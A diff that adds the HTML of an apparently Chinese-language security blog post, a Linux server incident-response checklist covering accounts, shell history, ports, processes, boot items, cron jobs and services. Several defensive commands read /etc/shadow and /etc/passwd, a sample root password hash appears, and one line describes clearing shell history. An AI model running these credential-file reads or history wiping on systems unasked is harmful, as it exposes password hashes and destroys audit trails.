@@ -1,0 +1,3362 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="m0nk3y">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="m0nk3y">
+    
+    <meta name="keywords" content="信息安全,CTF,攻防对抗,代码审计,安全研究,渗透测试">
+    
+    <meta name="description" content="">
+    <meta name="description" content="前言：2020年期间有幸参加了护网，客户在演习阶段出现了一次应急事件，Windows的邮件服务器出现了一个隐藏用户异地登录…… 当时客户有点情绪，加之我们这边确实都是擅长渗透、挖洞的师傅们，所以应急的时候显得很陌生，手忙脚乱，甚至可以说很业余。于是打算认真的按照网上一些关于应急响应的资料来复现一下，熟悉一些基本的东西。算是掌握一下常识好了。   所有参考资料仅用于学习  Version1: 参考">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux 服务器应急响应">
+<meta property="og:url" content="https://hack-for.fun/e312198e.html">
+<meta property="og:site_name" content="可惜没如果、m0nk3y‘s Blog">
+<meta property="og:description" content="前言：2020年期间有幸参加了护网，客户在演习阶段出现了一次应急事件，Windows的邮件服务器出现了一个隐藏用户异地登录…… 当时客户有点情绪，加之我们这边确实都是擅长渗透、挖洞的师傅们，所以应急的时候显得很陌生，手忙脚乱，甚至可以说很业余。于是打算认真的按照网上一些关于应急响应的资料来复现一下，熟悉一些基本的东西。算是掌握一下常识好了。   所有参考资料仅用于学习  Version1: 参考">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-1.png">
+<meta property="og:image" content="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-2.png">
+<meta property="og:image" content="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-2.png">
+<meta property="og:image" content="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-3.png">
+<meta property="og:image" content="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-4.png">
+<meta property="og:image" content="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-5.png">
+<meta property="og:image" content="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-7.png">
+<meta property="og:image" content="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-8.png">
+<meta property="og:image" content="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-1.png">
+<meta property="og:image" content="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-2.png">
+<meta property="og:image" content="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-3.png">
+<meta property="og:image" content="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-4.png">
+<meta property="og:image" content="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-4-1.png">
+<meta property="og:image" content="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-5.png">
+<meta property="article:published_time" content="2020-09-04T15:32:31.000Z">
+<meta property="article:modified_time" content="2020-09-07T08:40:36.620Z">
+<meta property="article:author" content="m0nk3y">
+<meta property="article:tag" content="Linux应急响应">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-1.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>Linux 服务器应急响应 · M0nk3y&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201102172212.JPG" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="可惜没如果、m0nk3y‘s Blog" type="application/atom+xml">
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >M0nk3y&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Linux 服务器应急响应</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>M0nk3y's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Linux 服务器应急响应
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Linux应急响应">Linux应急响应</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">10k</span>Reading time: <span class="post-count reading-time">43 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/09/04</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <blockquote>
+<p>前言：2020年期间有幸参加了护网，客户在演习阶段出现了一次应急事件，Windows的邮件服务器出现了一个隐藏用户异地登录…… 当时客户有点情绪，加之我们这边确实都是擅长渗透、挖洞的师傅们，所以应急的时候显得很陌生，手忙脚乱，甚至可以说很业余。于是打算认真的按照网上一些关于应急响应的资料来复现一下，熟悉一些基本的东西。算是掌握一下常识好了。</p>
+</blockquote>
+<blockquote>
+<p>所有参考资料仅用于学习</p>
+</blockquote>
+<p>Version1: 参考：Bypass 师傅的项目：<a target="_blank" rel="noopener" href="https://bypass007.github.io/Emergency-Response-Notes/">https://bypass007.github.io/Emergency-Response-Notes/</a></p>
+<h1 id="Linux-入侵排查"><a href="#Linux-入侵排查" class="headerlink" title="Linux 入侵排查"></a>Linux 入侵排查</h1><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。</p>
+<p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些Linux服务器入侵排查的思路。</p>
+<h3 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h3><h4 id="1-1-账号安全"><a href="#1-1-账号安全" class="headerlink" title="1.1 账号安全"></a>1.1 账号安全</h4><p><strong>基本使用：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1、用户信息文件&#x2F;etc&#x2F;passwd</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell</span><br><span class="line">注意：无密码只允许本机登陆，远程不允许登陆</span><br><span class="line"></span><br><span class="line">2、影子文件&#x2F;etc&#x2F;shadow</span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI&#x2F;:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br><span class="line">who     查看当前登录用户（tty本地登陆  pts远程登录）</span><br><span class="line">w       查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">uptime  查看登陆多久、多少用户，负载</span><br></pre></td></tr></table></figure>
+
+<p><strong>入侵排查：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br><span class="line">2、查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &#39;&#x2F;\$1|\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br><span class="line">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot;</span><br><span class="line">4、禁用或删除多余及可疑的帐号</span><br><span class="line">    usermod -L user    禁用帐号，帐号无法登录，&#x2F;etc&#x2F;shadow第二栏为!开头</span><br><span class="line">    userdel user       删除user用户</span><br><span class="line">    userdel -r user    将删除user用户，并且将&#x2F;home目录下的user目录一并删除</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-2-历史命令"><a href="#1-2-历史命令" class="headerlink" title="1.2 历史命令"></a>1.2 历史命令</h4><p><strong>基本使用：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">通过.bash_history查看帐号执行过的系统命令</span><br><span class="line">1、root的历史命令</span><br><span class="line">histroy</span><br><span class="line">2、打开&#x2F;home各帐号目录下的.bash_history，查看普通帐号的历史命令</span><br><span class="line"></span><br><span class="line">为历史的命令增加登录的IP地址、执行命令时间等信息：</span><br><span class="line">1）保存1万条命令</span><br><span class="line">sed -i &#39;s&#x2F;^HISTSIZE&#x3D;1000&#x2F;HISTSIZE&#x3D;10000&#x2F;g&#39; &#x2F;etc&#x2F;profile</span><br><span class="line">2）在&#x2F;etc&#x2F;profile的文件尾部添加如下行数配置信息：</span><br><span class="line">######jiagu history xianshi#########</span><br><span class="line">USER_IP&#x3D;&#96;who -u am i 2&gt;&#x2F;dev&#x2F;null | awk &#39;&#123;print $NF&#125;&#39; | sed -e &#39;s&#x2F;[()]&#x2F;&#x2F;g&#39;&#96;</span><br><span class="line">if [ &quot;$USER_IP&quot; &#x3D; &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP&#x3D;&#96;hostname&#96;</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT&#x3D;&quot;%F %T $USER_IP &#96;whoami&#96; &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND&#x3D;&quot;history -a&quot;</span><br><span class="line">######### jiagu history xianshi ##########</span><br><span class="line">3）source &#x2F;etc&#x2F;profile让配置生效</span><br><span class="line"></span><br><span class="line">生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">3、历史操作命令的清除：history -c</span><br><span class="line">但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录。</span><br></pre></td></tr></table></figure>
+
+<p><strong>入侵排查：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入用户目录下</span><br><span class="line">cat .bash_history &gt;&gt; history.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-3-检查异常端口"><a href="#1-3-检查异常端口" class="headerlink" title="1.3 检查异常端口"></a>1.3 检查异常端口</h4><p>使用netstat 网络连接命令，分析可疑端口、IP、PID</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp|more</span><br><span class="line"></span><br><span class="line">查看下pid所对应的进程文件路径，</span><br><span class="line">运行ls -l &#x2F;proc&#x2F;$PID&#x2F;exe或file &#x2F;proc&#x2F;$PID&#x2F;exe（$PID 为对应的pid 号）</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-4-检查异常进程"><a href="#1-4-检查异常进程" class="headerlink" title="1.4 检查异常进程"></a>1.4 检查异常进程</h4><p>使用ps命令，分析进程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pid</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-5-检查开机启动项"><a href="#1-5-检查开机启动项" class="headerlink" title="1.5 检查开机启动项"></a>1.5 检查开机启动项</h4><p><strong>基本使用：</strong></p>
+<p>系统运行级别示意图：</p>
+<table>
+<thead>
+<tr>
+<th align="center">运行级别</th>
+<th align="center">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">0</td>
+<td align="center">关机</td>
+</tr>
+<tr>
+<td align="center">1</td>
+<td align="center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">不完全的命令行模式，不含NFS服务</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="center">完全的命令行模式，就是标准字符界面</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="center">系统保留</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td align="center">图形模式</td>
+</tr>
+<tr>
+<td align="center">6</td>
+<td align="center">重启动</td>
+</tr>
+</tbody></table>
+<p>查看运行级别命令 runlevel</p>
+<p>系统默认允许级别</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi  &#x2F;etc&#x2F;inittab</span><br><span class="line">id&#x3D;3：initdefault  系统开机后直接进入哪个运行级别</span><br></pre></td></tr></table></figure>
+
+<p>开机启动配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;rc.local</span><br><span class="line">&#x2F;etc&#x2F;rc.d&#x2F;rc[0~6].d</span><br></pre></td></tr></table></figure>
+
+<p>例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在/etc/init.d目录下，然后在/etc/rc.d/rc*.d中建立软链接即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost ~]# ln -s &#x2F;etc&#x2F;init.d&#x2F;sshd &#x2F;etc&#x2F;rc.d&#x2F;rc3.d&#x2F;S100ssh</span><br></pre></td></tr></table></figure>
+
+<p>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。</p>
+<p><strong>入侵排查：</strong></p>
+<p>启动项文件： more /etc/rc.local /etc/rc.d/rc[0~6].d ls -l /etc/rc.d/rc3.d/</p>
+<h4 id="1-6-检查定时任务"><a href="#1-6-检查定时任务" class="headerlink" title="1.6 检查定时任务"></a>1.6 检查定时任务</h4><p><strong>基本使用</strong></p>
+<p>1、利用crontab创建计划任务</p>
+<ul>
+<li>基本命令</li>
+</ul>
+<p>crontab -l 列出某个用户cron服务的详细内容</p>
+<p>Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root</p>
+<p>crontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)</p>
+<p>crontab -e 使用编辑器编辑当前的crontab文件</p>
+<p>如：*/1* * echo “hello world” &gt;&gt; /tmp/test.txt 每分钟写入文件</p>
+<p>2、利用anacron实现异步定时任务调度</p>
+<ul>
+<li>使用案例</li>
+</ul>
+<p>每天运行 /home/backup.sh脚本： vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh</p>
+<p>当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。</p>
+<p><strong>入侵排查</strong></p>
+<p>重点关注以下目录中是否存在恶意脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;* </span><br><span class="line">&#x2F;etc&#x2F;crontab</span><br><span class="line">&#x2F;etc&#x2F;cron.d&#x2F;*</span><br><span class="line">&#x2F;etc&#x2F;cron.daily&#x2F;* </span><br><span class="line">&#x2F;etc&#x2F;cron.hourly&#x2F;* </span><br><span class="line">&#x2F;etc&#x2F;cron.monthly&#x2F;*</span><br><span class="line">&#x2F;etc&#x2F;cron.weekly&#x2F;</span><br><span class="line">&#x2F;etc&#x2F;anacrontab</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;anacron&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p>小技巧：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more &#x2F;etc&#x2F;cron.daily&#x2F;*  查看目录下所有文件</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-7-检查服务"><a href="#1-7-检查服务" class="headerlink" title="1.7 检查服务"></a>1.7 检查服务</h4><p><strong>服务自启动</strong></p>
+<p>第一种修改方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chkconfig [--level 运行级别] [独立服务名] [on|off]</span><br><span class="line">chkconfig –level  2345 httpd on  开启自启动</span><br><span class="line">chkconfig httpd on （默认level是2345）</span><br></pre></td></tr></table></figure>
+
+<p>第二种修改方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改&#x2F;etc&#x2F;re.d&#x2F;rc.local 文件  </span><br><span class="line">加入 &#x2F;etc&#x2F;init.d&#x2F;httpd start</span><br></pre></td></tr></table></figure>
+
+<p>第三种修改方法：</p>
+<p>使用ntsysv命令管理自启动，可以管理独立服务和xinetd服务。</p>
+<p><strong>入侵排查</strong></p>
+<p>1、查询已安装的服务：</p>
+<p>RPM包安装的服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务</span><br><span class="line">ps aux | grep crond 查看当前服务</span><br><span class="line"></span><br><span class="line">系统在3与5级别下的启动项 </span><br><span class="line">中文环境</span><br><span class="line">chkconfig --list | grep &quot;3:启用\|5:启用&quot;</span><br><span class="line">英文环境</span><br><span class="line">chkconfig --list | grep &quot;3:on\|5:on&quot;</span><br></pre></td></tr></table></figure>
+
+<p>源码包安装的服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看服务安装位置 ，一般是在&#x2F;user&#x2F;local&#x2F;</span><br><span class="line">service httpd start</span><br><span class="line">搜索&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;  查看是否存在</span><br></pre></td></tr></table></figure>
+
